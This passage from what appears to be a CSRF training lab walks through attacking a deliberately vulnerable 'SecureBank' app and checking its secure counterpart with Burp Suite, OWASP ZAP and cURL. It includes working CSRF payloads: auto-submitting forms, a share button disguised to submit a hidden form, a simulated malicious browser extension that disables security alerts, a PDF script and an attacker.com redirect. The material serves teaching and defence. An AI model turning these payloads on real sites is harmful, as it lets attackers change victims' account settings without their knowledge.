                logResult('XMLHttpRequest', false, 'Blocked by CORS');
            };
            
            xhr.send(JSON.stringify({ transaction_alerts: false }));
        }
    </script>
</body>
</html>
```

2. Log into the red (vulnerable) SecureBank
3. Open this HTML file and try each attack method
4. Observe which methods succeed and which are blocked

**Expected Behavior**:
- **CORS** may block some requests depending on server configuration
- However, even if response is blocked, **the request may still be processed**!
- Form-based attacks may fail if server strictly expects JSON
- Simple requests (without custom headers) will usually succeed

**Questions**:
- Why does CORS block reading the response but not sending the request?
- How does the Content-Type header affect CSRF?
- What's the difference between "simple" and "preflighted" requests?

**Advanced Challenge**:
Research and implement:
1. CORS preflight request bypass techniques
2. Content-Type manipulation to avoid preflight
3. Flash/plugin-based CSRF (historical)

---

## 7. Tool Integration

### 7.1 Burp Suite CSRF PoC Generator

Burp Suite includes a powerful CSRF Proof-of-Concept generator that automatically creates HTML attack pages.

**Steps**:

1. **Intercept Request in Burp**:
   - Configure your browser to use Burp as proxy (127.0.0.1:8080)
   - Log into SecureBank red version
   - Update your settings (transaction alerts, etc.)
   - Find the POST request to `/api/red/securebank/settings` in Burp's Proxy History

2. **Generate CSRF PoC**:
   - Right-click the request in Burp
   - Select `Engagement tools` → `Generate CSRF PoC`
   - Burp will create an HTML page with the attack

3. **Analyze the Generated PoC**:
```html
<!-- Burp Suite Generated CSRF PoC -->
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:5000/api/red/securebank/settings" method="POST">
      <input type="hidden" name="transaction_alerts" value="false" />
      <input type="hidden" name="email_notifications" value="false" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. **Test the PoC**:
   - Save the generated HTML to a file
   - Open it while logged into SecureBank
   - Verify the attack succeeds (vulnerable) or fails (secure)

5. **Test Against Blue Endpoint**:
   - Generate PoC for blue endpoint request
   - Notice it will fail due to missing CSRF token
   - This demonstrates the protection working

**Burp Suite Advanced Techniques**:
- Use "CSRF Token Tracker" extension to identify anti-CSRF tokens
- Use "Auto-Submit" option in PoC generator for stealthier attacks
- Test with different HTTP methods (GET, POST, PUT, DELETE)

---

### 7.2 OWASP ZAP CSRF Scanner

OWASP ZAP (Zed Attack Proxy) includes automated CSRF detection.

**Steps**:

1. **Configure ZAP**:
   - Start OWASP ZAP
   - Set browser proxy to localhost:8080
   - Configure ZAP's HUD (Heads-Up Display) for real-time alerts

2. **Spider the Application**:
   ```
   Tools → Spider → Start Spider
   Target: http://localhost:5000
   ```
   - ZAP will crawl all accessible pages
   - Login first so it can access authenticated endpoints

3. **Run Active Scan**:
   ```
   Tools → Active Scan → Start Scan
   Target: http://localhost:5000
   ```
   - Enable "Anti-CSRF Tokens Scanner" in scan policy
   - ZAP will test each form and AJAX request for CSRF vulnerabilities

4. **Review Alerts**:
   - Check the "Alerts" tab for CSRF findings
   - Red endpoint should show: **"Absence of Anti-CSRF Tokens"**
   - Blue endpoint should show: **No CSRF vulnerability** (tokens detected)

5. **Manual Testing with ZAP**:
   ```
   Right-click request → Resend → Manual Request Editor
   Remove any CSRF tokens from headers/body
   Send request
   ```
   - Vulnerable endpoints will accept the modified request
   - Secure endpoints will reject it

**ZAP Configuration for CSRF Testing**:
```
Options → Anti-CSRF Tokens:
- Token Name: csrf_token, X-CSRF-Token
- Enable auto-regeneration detection
- Flag requests without tokens as HIGH risk
```

**Expected ZAP Report**:
```
Alert: Absence of Anti-CSRF Tokens
Risk: High
Confidence: Medium
URL: http://localhost:5000/api/red/securebank/settings
Description: No known Anti-CSRF token found in the request.
Solution: Implement CSRF tokens for all state-changing operations.
```

---

### 7.3 Custom HTML/JavaScript CSRF Attacks

Create custom attack vectors for specific scenarios:

**Attack Vector 1: Social Media Embed**

```html
<!-- Disguised as innocent social media share button -->
<div style="text-align:center;">
    <h2>Share this article!</h2>
    <img src="share-icon.png" onclick="share()" style="cursor:pointer;">
</div>

<iframe name="csrf-target" style="display:none;"></iframe>
<form id="csrf-form" 
      action="http://securebank.com/api/red/securebank/settings" 
      method="POST" 
      target="csrf-target">
    <input type="hidden" name="transaction_alerts" value="false">
</form>

<script>
function share() {
    // User thinks they're sharing, but we're attacking
    document.getElementById('csrf-form').submit();
    
    // Show fake share confirmation
    alert('Thanks for sharing!');
}
</script>
```

**Attack Vector 2: Browser Extension Simulation**

```javascript
// Malicious browser extension that exploits CSRF
(function() {
    'use strict';
    
    // Wait for user to visit banking site
    if (window.location.hostname === 'securebank.com') {
        console.log('[Malicious Extension] Banking site detected');
        
        // Wait for user to login
        const checkLogin = setInterval(function() {
            fetch('/api/red/securebank/balance', {
                credentials: 'include'
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    console.log('[Malicious Extension] User logged in, executing attack');
                    clearInterval(checkLogin);
                    
                    // Disable all security alerts
                    fetch('/api/red/securebank/settings', {
                        method: 'POST',
                        credentials: 'include',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            transaction_alerts: false,
                            email_notifications: false,
                            login_alerts: false
                        })
                    })
                    .then(() => console.log('[Malicious Extension] Security disabled'));
                }
            });
        }, 5000);
    }
})();
```

**Attack Vector 3: PDF Embedded Attack**

Some PDF readers execute JavaScript:

```html
<!-- Embedded in PDF metadata or JavaScript action -->
<script>
app.launchURL("http://securebank.com/api/red/securebank/settings?transaction_alerts=false", true);
</script>
```

**Attack Vector 4: QR Code Redirect**

```
QR Code Content:
http://attacker.com/redirect.php?target=securebank.com

redirect.php:
<?php
header("Location: http://securebank.com/api/red/securebank/settings?alerts=off");
?>
```

User scans QR code thinking it's legitimate, but it executes a CSRF attack.

---

### 7.4 cURL CSRF Testing

Use cURL to manually test CSRF protection:

**Test 1: Attack Vulnerable Endpoint**

```bash
# Login and capture cookie
curl -c cookies.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' \
     http://localhost:5000/api/red/securebank/login

# Use cookie to attack (NO CSRF token needed)
curl -b cookies.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"transaction_alerts":false,"email_notifications":false}' \
     http://localhost:5000/api/red/securebank/settings

# Expected: {"success":true,"message":"Settings updated"}
# VULNERABLE! Attack succeeded without any token.
```

**Test 2: Attack Secure Endpoint (Should Fail)**

```bash
# Login to blue endpoint and capture cookie + CSRF token
curl -c cookies.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' \
     http://localhost:5000/api/blue/securebank/login \
     | jq -r '.csrf_token' > csrf_token.txt

# Attempt attack WITHOUT CSRF token
curl -b cookies.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"transaction_alerts":false}' \
     http://localhost:5000/api/blue/securebank/settings

# Expected: {"success":false,"error":"Invalid CSRF token - possible CSRF attack detected"}
# PROTECTED! Attack blocked.

# Legitimate request WITH CSRF token
CSRF_TOKEN=$(cat csrf_token.txt)
curl -b cookies.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -H "X-CSRF-Token: $CSRF_TOKEN" \
     -d '{"transaction_alerts":false}' \
     http://localhost:5000/api/blue/securebank/settings

# Expected: {"success":true,"message":"Settings updated","new_csrf_token":"..."}
# SUCCESS! Legitimate request with token accepted.
```

**Test 3: Cross-Origin Request Simulation**

```bash
# Simulate attacker's request from different origin
curl -X POST \
     -H "Content-Type: application/json" \
     -H "Origin: http://evil.com" \
     -H "Cookie: session=<stolen_cookie>" \
     -d '{"transaction_alerts":false}' \
     http://localhost:5000/api/red/securebank/settings

# Red endpoint: Success (vulnerable)
# Blue endpoint: Fails without CSRF token (secure)
```

**Test 4: Token Rotation Verification**

```bash
# Login and get initial token
TOKEN1=$(curl -c cookies.txt -X POST -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"password123"}' \
    http://localhost:5000/api/blue/securebank/login | jq -r '.csrf_token')

# Make request with token1
RESPONSE=$(curl -b cookies.txt -X POST \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: $TOKEN1" \
    -d '{"theme":"dark"}' \
    http://localhost:5000/api/blue/securebank/settings)

# Extract new token
TOKEN2=$(echo $RESPONSE | jq -r '.new_csrf_token')

echo "Original token: $TOKEN1"
echo "New token: $TOKEN2"

# Verify tokens are different
if [ "$TOKEN1" != "$TOKEN2" ]; then
    echo "✓ Token rotation working correctly"
else
    echo "✗ Token rotation failed"
fi

# Try using old token (should fail)
curl -b cookies.txt -X POST \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: $TOKEN1" \
    -d '{"theme":"light"}' \
    http://localhost:5000/api/blue/securebank/settings

# Expected: {"success":false,"error":"Invalid CSRF token..."}
```

---

## Summary

CSRF is a critical vulnerability in banking applications that can lead to unauthorized fund transfers, account takeover, and disabled security features. The key takeaways:

1. **Never trust requests based solely on session cookies** - cookies are automatically sent!
2. **Always implement CSRF tokens** for state-changing operations
3. **Use cryptographically secure random tokens** (`secrets.token_hex()`)
4. **Rotate tokens** after each state-changing operation
5. **Combine defenses**: CSRF tokens + SameSite cookies + CORS policies
6. **Validate tokens server-side** in custom headers (not cookies)
7. **Test thoroughly** with tools like Burp Suite and OWASP ZAP

The difference between SecureBank's red (vulnerable) and blue (secure) implementations demonstrates the critical importance of CSRF protection in financial applications. Always err on the side of security!

**Next Steps**: Practice the hands-on exercises, test with the provided tools, and review the code differences to fully understand CSRF prevention.

